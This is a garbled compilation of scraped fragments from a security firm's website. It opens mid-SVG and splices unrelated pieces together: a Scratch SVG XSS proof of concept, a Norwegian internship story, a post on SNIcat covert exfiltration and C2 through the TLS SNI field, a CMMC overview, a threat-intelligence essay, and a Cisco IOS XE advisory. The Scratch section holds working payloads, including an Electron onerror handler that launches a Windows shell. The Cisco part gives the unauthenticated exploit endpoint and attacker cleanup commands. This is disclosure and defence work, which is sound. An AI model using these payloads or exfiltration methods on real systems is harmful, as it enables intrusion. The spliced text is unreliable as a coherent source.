offset=\"0\" stop-color=\"#808285\"/><stop offset=\"1\" stop-color=\"#e6e7e8\"/></linearGradient><linearGradient id=\"linear-gradient-2\" x1=\"116.73\" y1=\"2.24\" x2=\"132.03\" y2=\"2.24\"gradientUnits=\"userSpaceOnUse\"><stop offset=\"0\" stop-color=\"#ef6035\"/><stop offset=\"1\" stop-color=\"#ff8200\"/></linearGradient></defs><title>Asset 3</title><g id=\"Layer_2\" data-name=\"Layer 2\"><g id=\"Layer_1-2\" data-name=\"Layer 1\"><path class=\"cls-1\" d=\"M32.68,13c2,0,2.92,1.06,2.92,3.34v8.45h3.24V15.44c0-3.43-1.81-5.4-5-5.4a5,5,0,0,0-4.67,2.56l-.25.51V10.44H25.78V24.78H29V16.53A3.34,3.34,0,0,1,32.68,13Z\"/><path class=\"cls-1\" d=\"M106.69,13c2,0,2.92,1.06,2.92,3.34v8.45h3.24V15.44c0-3.43-1.81-5.4-4.95-5.4a5,5,0,0,0-.68,2.56l-.24.51V10.44H99.79V24.78H103V16.53A3.35,3.35,0,0,1,106.69,13Z\"/><path class=\"cls-1\" d=\"M55.72,17.31c0-4.35-2.81-7.27-7-7.27s-7.27,3.14-7.27,7.64,3,7.51,7.62,7.51a7.67,7.67,0,0,0,6.11-2.68l-1.92-1.88a5.25,5.25,0,0,1-4.08,1.77,4.1,4.1,0,0,1-4.43-3.72l0-.15H55.65A10.21,10.21,0,0,0,55.72,17.31Zm-11-1a3.82,3.82,0,0,1,4-3.46,3.44,3.44,0,0,1,3.72,3.45Z\"/><path class=\"cls-1\" d=\"M74.51,13c1.83,0,2.68,1,2.68,3.29v8.5h3.25V15.42C80.44,12,78.69,10,75.66,10a5.15,5.15,0,0,0-4.88,2.76l-.12.29-.12-.3A4.28,4.28,0,0,0,66.28,10a4.86,4.86,0,0,0-4.51,2.54l-.24.49V10.44H58.34V24.78h3.24V16.51A3.25,3.25,0,0,1,65.07,13c1.83,0,2.68,1,2.68,3.29v8.5H71V16.51A3.27,3.27,0,0,1,74.51,13Z\"/><path class=\"cls-1\" d=\"M16.17,13c1.83,0,2.68,1,2.68,3.29v8.5h3.24V15.42C22.09,12,20.35,10,17.32,10a5.15,5.15,0,0,0-4.88,2.76l-.13.29-.11-.3A4.29,4.29,0,0,0,7.93,10a4.84,4.84,0,0,0-4.5,2.54l-.25.49V10.44H0V24.78H3.24V16.51A3.25,3.25,0,0,1,6.73,13c1.83,0,2.68,1,2.68,3.29v8.5h3.24V16.51A3.27,3.27,0,0,1,16.17,13Z\"/><path class=\"cls-1\" d=\"M90.25,10a7.32,7.32,0,0,0-7.56,7.58,7.56,7.56,0,1,0,15.12,0A7.32,7.32,0,0,0,90.25,10Zm0,12.22c-2.53,0-4.23-1.86-4.23-4.64S87.72,13,90.25,13s4.24,1.88,4.24,4.66S92.78,22.26,90.25,22.26Z\"/><polygon class=\"cls-1\" points=\"116.7 9.86 116.7 24.78 119.94 24.78 119.94 12.19 116.7 9.86\"/><path class=\"cls-1\" d=\"M133.29,19.77a3.83,3.83,0,0,1-3.56,2.42c-2.55,0-4.2-1.82-4.2-4.64s1.65-4.63,4.2-4.63a3.78,3.78,0,0,1,3.56,2.39L136,13.83A6.66,6.66,0,0,0,129.53,10c-4.31,0-7.33,3.12-7.33,7.58s3,7.56,7.33,7.56a6.66,6.66,0,0,0,6.41-3.85Z\"/><polygon class=\"cls-2\" points=\"123.43 4.48 123.43 9.31 116.73 4.49 123.43 4.48\"/><polygon class=\"cls-3\" points=\"132.03 4.49 116.73 4.49 116.73 0 125.83 0 132.03 4.49\"/></g></g></svg>Note that I have removed the  attribute of the opening <> tag.The result? Success! Our “Game Over” popup appears after loading the SVG into Scratch.The popup proves that we're capable of running arbitrary JavaScript within the application, but how can we use it for something more powerful? The short answer is that you can replace the proof-of-concept code with any JavaScript you like. The longer answer is that you need to mind the context of the application.There are several versions of Scratch available, and what you can do depends on which version you use. We’ll look at and exploit both the desktop and web-based versions.The  application we've been using in this blog post runs as a local application in Windows and enables more severe exploits. Scratch is still a web application under the hood, but the desktop application is built with , enabling web pages to run as local desktop applications. We can take advantage of the Electron ecosystem to perform operating system calls on the host computer using the following new shortened SVG payload:<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"><image href=\"http://127.0.0.1:8765/missing.png\" onerror=\"require('electron').shell.openExternal('cmd')\" /></svg>This proof of concept launches a Windows terminal () using the embedded Electron JavaScript library of the desktop application. XXS vulnerabilities are in practice  (RCE) vulnerabilities with Electron. The same approach can be used to execute a covert reverse shell payload easily generated with tools such as . This would allow an attacker to take control over the host computer.The web browser version, similar to the one hosted on the official Scratch website, does not allow your script to do anything more than JavaScript running on a traditional website. However with that said, this presents plenty of opportunities for an attacker to further compromise the client, for example by using the  mentioned earlier.This last payload is intended for the web browser based version of Scratch and is made to illustrate the severity of the vulnerability even without access to calling system executables. I'm borrowing the publicly available picture of our department manager for this example, and hope he'll forgive me, and then I'll use the  rather than the  event handler. This example also illustrates SVG's ability to load external content:<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"><image href=\"https://www.mnemonic.no/globalassets/foto-ansatte/andreas-furuseth_1153.jpg\"  /></svg>I'll also store it in a Scratch project file for this example, to show you that the vulnerability can be hidden within seemingly innocent project files. Scratch's project files are plain  that have their file extensions renamed to .I first created a basic Scratch project, saved it, then renamed the extension to  and extracted its content. Then, I replaced one of the SVGs with the payload above and made a new zip file of all the files. The last step was to rename the extension into  and reload the project in Scratch. The result is shown below:We see that the graphical user interface is completely redrawn with contents of our choosing, including Andreas’ picture.Closing statementsThis blog post used information from a publicly known vulnerability in  and  to develop a functional proof of concept exploit.

Vi ble ansatt som gruppe, med den hensikten at den ulike kompetansen vår skulle komme hverandre til nytte. Alle har hatt forskjellige ting å bidra med, og vi har samarbeidet godt underveis og passet på at alle tre henger med, sier Isabel.Ideen til prosjektet Isabel, Johannes og Anna skulle bruke sommeren sin på ble til i løpet av våren. Med krigen i Ukraina som bakteppe, ble Den norske Helsingforskomité og Røde Kors spurt om de var interessert i hjelp innen IT-sikkerhet.Oppdraget til sommerstudentene i MSI gikk ut på å hjelpe de to organisasjonene med ulike sikkerhetsløsninger, innenfor områder som passord-policy, e-postautentisering, domenekontroll o.l.- I løpet av sommeren har vi sett på noen sikkerhetsutfordringer disse og tilsvarende organisasjoner har, miljøene og retningslinjene de har i dag, samt kommet med anbefalinger og gjennomført noen endringer, forteller Anna.- Vi har selv hatt ansvar for prosjektet og fått styre det selv. Det har vært et stort ansvar, som vi til tider har kjent på, men det har føltes trygt fordi vi har mnemonic i ryggen, fortsetter hun.- Vi har fått kjenne veldig på mestringsfølelsen i løpet av sommeren. Ingen har fortalt oss hvordan vi skal løse de ulike utfordringene, men vi har fått anbefalinger og veiledning, og vi har diskutert ulike innfallsvinkler med kolleger i mnemonic og funnet ut av ting sammen underveis, sier Johannes.Prosjektet, som varte i seks uker er ett av syv forskjellige sommerprosjekt i mnemonic denne internship-perioden. Felles for prosjektene er at de er med på å løse ekte behov ute hos kunder og blant sikkerhetsanalytikerne i mnemonic. Her kan du lese mer om ett av de andre prosjektene mnemonics sommerstudenter arbeidet på i sommer hos .- Det har vært spennende å jobbe med ekte kunder og ekte sikkerhetsutfordringer. Når man jobber tett på kunden som dette, så skjønner man hvor viktig det er at vi gjør det vi gjør. Vi har fått føle på at arbeidet vi gjør faktisk skaper verdi for kunden. Det er spesielt givende når det er disse organisasjonene det er snakk om, sier Johannes.- Samtidig har vi fått mye teknisk kunnskap ut fra prosjekt også, forteller Isabel. – Jeg har gjort meg mange erfaringer jeg ikke hadde fra før. En ting er det tekniske og alt det nye man lærer om det, men man lærer også hvordan man jobber med mennesker. Det gjør at man skjønner at man må tenke helhetlig rundt det man anbefaler. Selv om det er lett å fordype seg i interessante tekniske funn, så skal jo løsningene våre være en del av et større miljø og brukes av menneskene som jobber der.Dag Fedøy, kommunikasjonssjef i Den norske Helsingforskomité forteller at de er godt fornøyde med arbeidet til sommerstudentene.- Vi i Helsingforskomiteen er strålende fornøyd med innsatsen til studentene! Vi har møtt profesjonelle og dyktige fagfolk som har hjulpet en eksponert idealistisk menneskerettighetsorganisasjon til å ta viktige steg for å bedre IT-sikkerheten.

{"title": "SNIcat: Circumventing the guardians", "ingress": "How the security features in state-of-the-art TLS inspection solutions can be exploited for covert data exfiltration", "content": "This blog post describes how we discovered a new stealthy method of data exfiltration that specifically bypasses network security solutions such as web proxies, next generation firewalls (NGFW), and dedicated solutions for TLS interception and inspection. Our testing validates that this is a widespread issue that affects different types of security solutions as well as solutions from a variety of vendors. We successfully tested our technique against products from F5 Networks, Palo Alto Networks and Fortinet, and speculate that many other vendors also are susceptible.By using our exfiltration method , we found that we can bypass a security solution performing TLS inspection, even when the Command & Control (C2) domain we use is blocked by common reputation and threat prevention features built into the security solutions themselves. In short, we found that solutions designed to protect users, introduced them to a new vulnerability.We have also developed mitigation techniques, including signatures available for download, as described below.For many years both of us have designed security architecture around network man-in-the-middle devices such as web proxies, firewalls and load balancers. This playground often piques our curiosity, and this time it made us want to look at a few solutions from an attacker’s perspective.We decided to investigate how network security solutions handled the TLS’ Server Name Indication (SNI) field for categorising and blocking bad URLs/hostnames (more on the SNI field later). Our initial goal was to simply test if we could bypass these security solutions by inserting a legitimate hostname in the SNI field and sending the traffic to a domain categorised as a bad domain.However, this didn’t pan out as all the security solutions we tested verified that the subject-cn of the server certificate matched the value in the SNI sent by the client. If it didn’t match, the traffic was blocked. It was worth trying, at least.This initial experiment made us aware that the TLS Client Hello packet always reached the destination server, even if it was categorised as a bad URL/domain by the security solution. The solution only blocked the session  the TLS handshake had been completed, but not earlier.We then decided to play with the idea that we could leverage this unidirectional stream to exfiltrate data and bypass network security features, and therefore be able to send data to a known bad domain/host.Modern network security solutions that perform TLS inspection often have a functionality called . Basically, the security solution can forward a copy of the decrypted traffic to a mirror port, which is commonly connected to an IDS that can now inspect the once encrypted traffic. This is all well and good from a security monitoring perspective. However, we discovered that devices connected to the mirror port do not receive the TLS handshake at all, opening up a new way of performing stealthy exfiltration utilising the TLS Client Hello.Because of the way the security solutions described above behaved, we realised that we could exfiltrate data utilising extensions of the Client Hello of the TLS protocol. We chose the SNI field as an exfiltration container because it was the one extension that was never manipulated or changed by any of the in-line security solutions.During the handshake process, the SNI is populated by a value provided by the client and instructs the server which hostname the client is trying to connect to, and what certificate it should present to the client.When utilising a security solution to actively allow or deny traffic based on what domain/URL the client is connecting to, this is usually how it works:We then conducted a quick proof of concept which proved we could misuse this field by injecting arbitrary data and successfully employing this once legitimate extension as a “smuggling container” through the security solutions, without the traffic being copied to a decryption mirror port.So far so good. We had demonstrated how we could send data out from a client. The next step was to find a way to control the client using a RAT (Remote Access Trojan) that could, in turn, leverage this new communication channel. As mentioned earlier, at this stage of testing the channel was only working one-way since every tested solution was blocking the returning traffic coming back from the server and that was obviously not an optimal scenario. We were stuck, and in need of a new way of letting the control server’s data pass back through the security solution.To overcome this hurdle, we built an interim out of band C2 based on Instagram, which employed embedded C2 control commands inside Instagram’s own comments section. This was enough to get a working demo which proved our theory correct, functional and hopefully extensible: we were able to remotely control the compromised host and selectively exfiltrate data.This result encouraged us to continue testing. Our next goal was to replace the Instagram component since social media websites are easily and often blocked by internal security policies, which would have interfered with our C2 communication. We continued pursuing an in-band alternative of establishing an end-to-end communication between the agent and the Command & Control server.After some more tinkering, we discovered a common denominator in every solution we tested. As long as the server presents a valid and trusted certificate during the TLS handshake, the security solution will always present an emulated version of that certificate to the client, signed by the solution’s built-in CA. This behaviour occurs even if the domain used is blacklisted by a reputation database (URL/domain categorisation). In addition, by serving a self-signed certificate from a server, the security solution either presents the client with an emulated self-signed certificate, or a simple TCP reset.On a very primitive communication channel, a basic response would only require a binary YES/NO capability, and we now have it: a valid, trusted certificate gives us a “YES”, and an untrusted, self-signed certificate gives us “NO”. We implemented this logic into our SNIcat tool.SNIcat comprises of two separate but interdependent components:The passive agent is equipped with various commands, including the ability to exfiltrate (i.e. upload) files to the server. It constantly loops between all the available commands and waits for the C2 server to select the desired one by leveraging the binary YES/NO capability mentioned earlier. With SNIcat, we extended this logic so that we could provide a minimal but effective standalone Command Line Interface (CLI). The CLI can offer basic file system navigation commands such as jumping between folders, listing files and, obviously, exfiltration.Here is the C2 CLI in action, where we use some of the built-in commands to navigate the file system and exfiltrate a file from the agent to the C2 server:While developing this offensive tool, we also worked on developing different ways to mitigate and detect this kind of attack, both from the endpoint and the security perimeter solution. We have had a good dialogue with the vendors whose products we tested, and the following suggestions have been shared with them. As a result, a few of the vendors have provided their own security advisory with their suggested work-arounds and/or fixes. Links to the advisories can be found in our reference section below.We also developed a very early-stage proof of concept of a ‘passiveSNI’ detection tool, conceptually similar to the well-known PassiveDNS application.It works by constantly monitoring and logging every TLS/Hello packet sent through any network socket interface. These generated logs can be gathered and analysed through a SIEM solution against any well-known signature or behavioural analytics.We speculate that more vendors than those mentioned in this blog post are susceptible to our SNIcat approach. Even though it would have been interesting to test every network security solution on the market, we had limited resources and scope this time around. We therefore advise vendors to test if their products are vulnerable to SNIcat. In addition, end users and enterprises may find it helpful to test their solutions with our PoC code that you can find on .SNIcat was successfully able to bypass the following products and their respective software versions:Responsible disclosure procedures were followed per vendor policy.", "url": "https://www.mnemonic.io/resources/blog/introducing-snicat/", "category": "resources", "subcategory": "blog"},

This blogpost outlines the core principles of the CMMC framework, and discusses how CMMC differs from other established frameworks when it comes to security practices, maturity definitions and the certification process itself.", "content": "The Cybersecurity Maturity Model Certification (CMMC) was introduced in January 2020 by the United States’ Office of the Under Secretary of Defense for Acquisition & Sustainment. This blogpost outlines the core principles of the CMMC framework, and discusses how CMMC differs from other established frameworks when it comes to security practices, maturity definitions and the certification process itself.It will also present how CMMC will influence both US organisations and international subcontractors of the US defence industry performing everything from software development to human resource services. It is expected that subcontractors that retrieve, process or use sensitive information from the US defence industry will be subject to the requirements defined in the CMMC framework.The blog post also presents some advice on how to get a head start while we are waiting for the framework to be rolled out.There is no shortage of information security frameworks. Some of the more established frameworks include ISO 27001, NIST SP 800-171, and NIST 800 SP 800-53. These are often accompanied by compliance reports such as SOC 2 or ISAE 3402. If there weren’t’ already enough acronyms, here’s one more: CMMC. This particular acronym however may prove to have a significant impact on the global defence industry.CMMC is a certification framework that sets out to secure the US defence industry and their associated Controlled Unclassified Information (CUI). Defining CUI could be a blogpost itself, but to keep it short; it is information that is considered to be sensitive, but not so sensitive that it is considered classified. In other words, it is sensitive information that the nation does not depend upon.The CMMC framework also grants organisations the possibility to certify and attest their information security maturity, much like the .By the looks of it, the framework might have consequences beyond just the defence industry. The framework consists of a lot of useful content, and there are few limitations in regards to which sectors it might affect - both public and private organisations are on the table. Nevertheless, implementation of the CMMC framework outside the defence industry is a futuristic topic; the US defence industry consist of more than 300,000 organisations, and it is a safe assumption to say that it will take some time to get everyone on-board.If you are working for a non-US organisation, the CMMC will still apply to you. One of our key learnings is that CMMC will affect all subcontractors of the US organisation that process or store Federal Contract Information (FCI) and/or CUI as part of their service delivery. FCI is easier than CUI to define, as this primarily includes contractual information not intended for public release.One of the key elements that differentiate CMMC from other frameworks is that CMMC has defined five different levels of cyber hygiene. This means that CMMC is not a one-size-fits-all-framework. This approach is refreshing change in the world of information security frameworks. Most frameworks today, especially those you can certify yourself after, are rarely open for tailoring the requirements to the actual needs of the organisation.The cyber security maturity levels outlined in CMMC are quite straightforward. The lowest levels set the basics requirements to information security, while the higher levels set more mature requirements. Each level defines a set of practices and policies that need to be adhered to. How to adhere to each practice is not yet set in stone, but I suspect that the specific controls used to measure maturity will be similar to what we have seen in  and in .Each level is further summarised in the table below:The CMMC Accreditation Body (CMMC-AB) have throughout 2020 tried to nourish the public with answers, timelines and other information relevant to the CMMC-framework. Their  introduces the reader to the various roles that will be applicable. These roles differ in scope and include both organisation-wide roles and certifications as well as individual roles and certifications.The currently published roles are defined below: – C3PAOs are organisations employing Certified Assessors which are responsible for auditing and certifying provider organisations according to the CMMC requirements. – RPOs are organisations employing registered practitioners and are authorised to represent the organisation as they are familiar with the basic constructs of the CMMC standard with a CMMC-AB provided logo. They will provide non-certified CMMC consulting services. – LPPs are organisations that create and provide the training materials for CMMC. The training material is used by Certified Instructors for training Certified Professionals and Certified Assessor applicants.There are also three additional organisation roles, which are published but not yet defined:  – LIs are expected to be individuals that are trained and certified to teach assessor applicants the details and rigors of their CMMC assessment practices. – LTPs are expected to be either public or private organisations that train Certified Professionals and Certified Assessors.– CMMC-AB have not defined the responsibilities of the LSPs, but the name of the role gives us some indication of what it might be.The timeline for the framework is constantly changing, so the timeline presented here may soon be adjusted. However as of November 2020, the timeline is:There are still a multitude of questions and concerns surrounding the CMMC framework, and we will continue looking into how the framework will hit the global defence industry. Nevertheless, if your organisation processes FCI or CUI today, or are planning to do so in future, then it is very likely that you will be subject to the CMMC requirements and should already be preparing for them.To give you a head start, here are our recommendations on how to prepare for the CMMC framework:", "url": "https://www.mnemonic.io/resources/blog/cmmc-new-cybersecurity-requirements-to-work-with-the-us-defence-industry/", "category": "resources", "subcategory": "blog"},

For most companies, it involves understanding the specific tactics and techniques that can exploit vulnerabilities to harm assets. This insight provides a basis for decision-makers to prioritise the security measures best suited to the actual threats the organisation faces. Security measures rooted in an understanding of threats contribute to better resource allocation in preventive security work. A threat assessment is a good place to start.In May 2023,  that should be addressed before 2030. The report is an important contribution to the public debate, and to policy formulation in light of geopolitical volatility and an increasingly complex security landscape. This blog post concerns a fundamental point in the report: the ability to understand threats is a cornerstone of how businesses' work with risk and security management.NSM, 2023 (unofficial translation)A good understanding of your business’ threat landscape is a necessary prerequisite for implementing well-considered security measures based on risk.  is a crucial input to risk assessments and how the company works with security. We must understand the threat landscape to make informed choices about protective measures, and threat intelligence should be an integral part of risk and security management in companies and governmental entities.It is necessary to understand the strategic and geopolitical context we find ourselves in. The government's publicly available information about vulnerable sectors and the threat actors' objectives is a starting point. But it is not enough. The publicly available security and threat assessments produced by many Western governments set an important strategic framework but can be difficult to translate into concrete security measures for individual companies. The underlying information and data are often classified, and have a legitimate need for confidentiality. Access to classified information wouldn’t necessarily be an adequate solution. The mandates and mission-focus of the intelligence and security services overlap only to a limited extent with the information needs of most private and public companies. Øyvind Husby, CEO of ICT-Norway stated earlier this year (authors own translation). Situational awareness, to understand the situation, in itself does not provide protection. However, it does provide an informed basis for action. We must have knowledge of the specific tactics and techniques an attacker can use against us in order to choose the most appropriate countermeasures. We need a fact-based information basis to assess which threats can exploit our vulnerabilities to harm our assets.For many companies it will be inefficient to focus on attribution, that is, who is behind an attack or poses a threat. The threat landscape is constantly evolving, and attribution is technically difficult. In addition, tactics and techniques are used across different actors and categories of actors, such as state intelligence services and professional criminal groups.Of course, attribution can be very important to the authorities. For example, if military plans or political decision-making processes lose confidentiality it is relevant to know who got hold of the material. Another example would be sabotage and destructive cyber operations, where credible attribution could be crucial to ensure a coherent allied response. However, for most Norwegian companies, attribution is not necessary to assess what are the relevant security measures to detect, prevent, and respond to unwanted activity. What they need is concrete and detailed information about the means an attacker can use to harm them. Attribution can still be valuable in the investigation of serious incidents, but this usually requires involvement from  (unofficial translation)Knowledge about threats is a cornerstone in proactive and continuous work with security management. This requires robust organisations capable of working cross-functionally with risk, threat intelligence, and technical solutions. One approach is to describe scenarios, expressed as specific threat events, that the company can be exposed to. The scenarios provide an informed basis for developing protective measures and security solutions. In this way, a risk-based and holistic approach to security can be built layer by layer. The model can be used to visualise the relationship between threats, vulnerabilities, and assets in risk management. Knowledge and understanding of threats are important throughout the bow-tie model of risk, for example when it comes to detection, the choice of security measures and incident handling.Senior management is responsible for defining the organisation's risk tolerance. Therefore, the risk the organisation faces is an important information requirement. For the security organisation to meet this requirement, it's crucial that they specify and manage information requirements about the threat landscape through a structured process (Information Requirement Management). A threat assessment is an important input to the risk assessment, and the risk assessment provide a basis for developing new information requirements about threats. In effect, this process helps the whole organisation understand their threat landscape better, enabling better risk management. Leadership engagement ensures that the work with threat intelligence is linked to the company's long-term security work and is anchored in the company's security and business objectives. In this way, information requirement management becomes a part of the overall risk and security management process. A hardening geopolitical climate, an evolving threat landscape and rapid technological developments require continuous work with security. Governments and private actors must work together, while simultaneously having a good understanding of their roles. The authorities help to explain the overall geopolitical developments and strategic threat landscape. The formulation and enforcement of laws and regulations are critically important to ensure security across sectors and defend one’s international competitiveness. In Norway, the Ministries are tasked with defining so-called “fundamental national functions (GNF)” in line with. There is also a proposed , aligned with EU regulations (NIS directive). These are examples of important ongoing government-led processes that affect businesses. Hence, companies must plan and prepare for additional security measures in case there is a change in the threat landscape. This requires a holistic and risk-based security management system, as well as measures that are adapted to the actual threat the company faces.“Weakness in an information system, system security procedures, internal controls, or implementation that could be exploited or triggered by a threat source” ().The relationship between threats and vulnerabilities is complex and seldom one-to-one. A vulnerability can potentially be exploited by multiple threats, and a threat can potentially exploit multiple vulnerabilities.

They have yet to release 16.12.10a, 17.3.8a and 17.6.6a for older release trains.Our assessment is that the two Cisco vulnerabilities have the potential to impact many organisations. This is due to the widespread use of these devices and the role and access into networks these devices usually have. In addition, there is no specialist competency required to exploit the vulnerabilities.Our scans of the entire IPv4 space have discovered more than 42 000 compromised devices as of October 19th. We continue to scan and track developments.CVE-2023-20198 can be exploited by sending a unauthenticated POST request tohttps://[IP/domain of IOS device]/webui/create_userCVE-2023-20273 can be exploited by authenticating as the user created by exploiting CVE-2023-20198 followed by a POST request to a URI path not known at the moment.All Cisco IOS XE devices running any releases prior to 17.9.4a with the HTTP server enabled are affected.mnemonic have performed several scans of the entire IPv4 space to look for exposed and compromised IOS devices. The results are continuously being analysed by our threat intelligence team. Customers with compromised devices are being notified on a case-by-case basis as soon as any customer devices are found within the results.On a general basis, we have found over 42 000 exploited devices in the IPv4 space per 19th of October. We are continuously running scans.Some researchers have reported a sharp reduction in compromised devices, but this seems to be caused by a patch deployed to all implants by the threat actor. The threat actor behind the mass exploitation and deployment of the implants is currently unknown.mnemonic assesses with high confidence that several threat actors will try to compromise publicly exposed and vulnerable Cisco IOS XE devices. The two Cisco vulnerabilities have the potential to impact many organisations. This is due to the widespread use of these devices and the role and access into networks these devices usually have. In addition, there is no specialist competency required to exploit the vulnerabilities.Moderately capable criminals as well as nation state actors are likely to be interested in exploiting this vulnerability. Either to use as an entry vector for lateral movement or as a potential proxy for C2 traffic. Limited visibility on devices like this makes them an especially popular target for nation state actors that want to avoid detection. Depending on the network topology of affected organisations, the access to management networks and other sensitive networks from vulnerable devices will increase the potential impact of exploitation and potential post-compromise activity.If you have any Cisco appliances running IOS XE and have the HTTP server enabled, you are impacted by this vulnerability. This includes switches, routers, wireless LAN controllers and any other appliances running IOS XE.To check if HTTP server is enabled on your devices, run the following command on the Cisco IOS appliance in question:show running-config | include ip http server|secure|activeIf the output contains either one, or both, of the following lines you are affected and we recommend that you follow a set of mitigating actions described below:ip http serverip http secure-serverno ip http serverno ip http secure-server Check system logs for configuration changes through the web interface:%SYS-5-CONFIG_P: Configured programmatically by process SEP_webui_wsma_http from console as user on lineFollowed by a successful login by a new, unknown user:%SEC_LOGIN-5-WEBLOGIN_SUCCESS: Login Success [user: user] [Source: source_IP_address] at 03:42:13 UTC Wed Oct 11 2023To identify exploitation of CVE-2023-20273, look for the following content in the logs:%WEBUI-6-INSTALL_OPERATION_INFO: User: username, Install Operation: ADD filename and if “filename” is an unexpected file and “username” is the new user created by the threat actor in the previous steps.Cisco and  However, those could be intrusion-specific and should not be used as the only indicator of compromise.5.149.249[.].74154.53.56[.]231cisco_tac_admincisco_supportcisco_sys_managerObserved post compromise activity by Rapid7:show running-configshow voice register globalshow dial-peer voice summaryshow platformshow flow monitorshow platformshow platform software iox-serviceshow iox-servicedir bootflash:dir flash:clear loggingno username cisco_supportno username cisco_tac_adminno username cisco_sys_managerThese commands include deletion/clean-up of logs. This means that even though local logs do not contain any indicators of compromise there still is a possibility the device have been compromised. Looking at logs sent to a remote server would in this case be necessary to assess whether the device has been compromised.There have also been observations where the users created by utilising these vulnerabilities have subsequently been deleted.

If the device has been identified as compromised, we advise you to initiate incident response and further investigation into what actions might have been executed on the device. It is essential to look for lateral movement from the compromised device. It is important to note that if the device have been exposed on the internet the device should be assumed breached, even though none of the previously mentioned indicators of compromise have been observed.mnemonic have implemented several detections for this vulnerability. A set of our detections will look for the log entries described by Cisco in Cisco IOS logs forwarded to us, and another set will look at the request paths used to trigger the exploit in network logs from sensors. Customers forwarding Cisco IOS logs to us for analysis as well as those who have Argus Network Analyser are covered by our detection.Customers with Argus CVM can view any affected assets searching for CVE-2023-20198 in the asset database. Alerts raised for the vulnerability follows the customer's defined policy. For further inquiries regarding detection coverage in ACVM, please create a ticket in the Argus portal.For all of our Argus Security Operations customers we have run a set of sweeps in the available data provided to us either through API integrations or sent to us for analysis. The sweeps we have run look for known indicators. It is important to note that we can only sweep data we have available, meaning that if Cisco IOS logs or netflow data is unavailable, we will not be able to detect any activity related to this vulnerability. Depending on customer environments and products in those environments we are able to detect attempts of lateral movement and further exploitation on hosts and devices with correct coverage.In addition to these sweeps in available data we have scanned the entire IPv4 space and notified customers with compromised devices exposed on the public internet.

For many IT outsourcing providers, their service delivery model is simply not equipped to be delivered from employees working at a home office.As organisations scramble to determine if their well-documented SLAs are still valid, a more significant risk is if the confidentiality, integrity and availability of their data and services are being maintained and handled appropriately from their IT outsourcing partners’ homebound workforce.This webinar touches upon eight technologies that organisations should consider to reduce IT outsourcing risks.This is a recording of a webinar we hosted Thursday April 2nd 2020, from our multi-part webinar series where we cut straight to the chase in these unprecedented times – answering questions about what challenges our customers are asking us about, what security threats you should be considering, and how you can protect your organisation.", "url": "https://www.mnemonic.io/resources/on-demand-webinars/it-outsourcing-after-covid-19-risks-concerns-and-mitigations/", "category": "resources", "subcategory": "on-demand-webinars"},

He will give insight into mnemonic’s views on email security, and recommendations on how email can be secured in 2023.: 2/5: NorwegianFew productivity tools are as critical to modern business as Microsoft 365. Unfortunately, the platform’s central role in the workplace also makes it a prime target for threat actors — and often, it’s their primary vector for compromising their victims. It's no wonder experts such as Gartner and Forrester recommend adding additional measures to your email, cloud and data security.During this presentation, Michael will go through a real case from a Norwegian customer that experiences this kind of an attack, and he will also talk about how you with better insights to your security layer will be able to protect your organisation.: 2/5: SwedishEmail continues to be a preferred attack vector in both opportunistic and targeted attacks, and is commonly one of many stages in advanced attacks.

Hackers will always be smarter than security vendors. This is why a rethink is required on how to stop them.It is also important to understand that simply locking down a PC won’t work in a post-pandemic era. The concept of an \"endpoint\" changed to include desktops, servers, mobile devices, and workloads that can be operated from anywhere at any time – not just in the office during business hours. As a result, IT is struggling how these endpoints should be monitored and maintained, alerts and interesting events be reviewed, managed and concluded. Because hackers are more likely to attack at 2:00 on a Sunday versus 15:00 on a Wednesday, it means that any modern security defense should include specially trained security engineers and operations centre which operate 24x7x365. This is where nmemonic can help.Recognised by Gartner as one of the top Managed Detection & Response service in the world, mnemonic provides 24x7x365 managed protection against cyberattacks and security threats.

Dokumentet understreker vår forpliktelse til å respektere internasjonalt anerkjente arbeids- og menneskerettigheter, vårt arbeid i kampen mot korrupsjon og hvitvasking, og vårt fokus på miljø og bærekraft.1. juli 2022 trådde Åpenhetsloven i kraft. I mnemonic har vi etablert prosesser og rutiner for gjennomføring av aktsomhetsvurderinger, både av våre leverandører og våre forretningspartnere. Metode og oppfølging for aktsomhetsvurdering er innlemmet i vårt ledelsessystem for Kvalitet (ISO9001) og informasjonssikkerhet (ISO27001), hvor risikovurdering er helt sentralt i vurderingen av faren for og konsekvensen av brudd på anstendig arbeidsforhold og menneskerettigheter – i egen virksomhet og i vår leverandørkjede. Denne Redegjørelsen gjelder for perioden 1. juli 2022 til 31. desember 2022.Basert på aktsomhetsvurderingene våre, er det begrenset risiko i vår virksomhet for negative konsekvenser for grunnleggende menneskerettigheter og anstendige arbeidsforhold.Gjennom systematiske risikovurderinger har vi identifisert at de største risikoene knytter seg til innkjøp av produkter for videresalg eller produkter og tjenester til eget bruk (inkludert transport), samt innleie av personell. De identifiserte risikoene er dokumentert i vårt ledelsessystem og vurdert ut fra nåsituasjon og etter gjennomførte tiltak.Risikoen for negative konsekvenser for grunnleggende menneskerettigheter og anstendige arbeidsforhold hos mnemonic anses som svært lav. Kompetente, fornøyde og engasjerte medarbeidere er vår viktigste innsatsfaktor, og mnemonic legger stor vekt på tillitsbasert ledelse, autonomi og høy faglig integritet.Aksjemajoriteten i mnemonic er eid av de ansatte, noe som gir en unik mulighet til å optimalisere arbeidsvilkårene i bedriften. Vi har et godt og inkluderende arbeidsmiljø som gjenspeiler seg i høy trivsel hos de ansatte, med svært lavt «gjennomtrekk» på ca. 4%. mnemonic ble også kåret til Norges beste arbeidsplass av Great Place To Work både i 2022 og 2023.Vårt ledelsessystem for informasjonssikkerhet og kvalitet har vært ISO-sertifisert siden hhv. 2005 og 2013 med årlige revisjoner. Dette betyr at Åpenhetsloven og våre identifiserte tiltak er innlemmet i et allerede velfungerende og godt etablert system. All systematikk for oppfølging av tiltakene som er nevnt, er dokumentert i prosedyrer og implementert i vårt ledelsessystem, og kontroller blir gjort ved årlig gjennomføring av interne og eksterne revisjoner. Dersom det avdekkes kritikkverdige forhold og/eller brudd knyttet til anstendige arbeidsforhold og menneskerettigheter, blir dette registrert og fulgt opp i vårt interne saksbehandlingsverktøy.For å minimere eventuelt negativ belastning av de identifiserte risikoene, er det implementert tiltak i våre prosedyrer for evaluering av alle aktive leverandører og forretningspartnere som leverer produkter/tjenester for videresalg og for internt bruk.Vi stiller krav til at alle våre nye og eksisterende leverandører som vi benytter oss av for videresalg av løsninger og tjenester, om å dokumentere aktivt arbeid med anstendig arbeidsforhold og 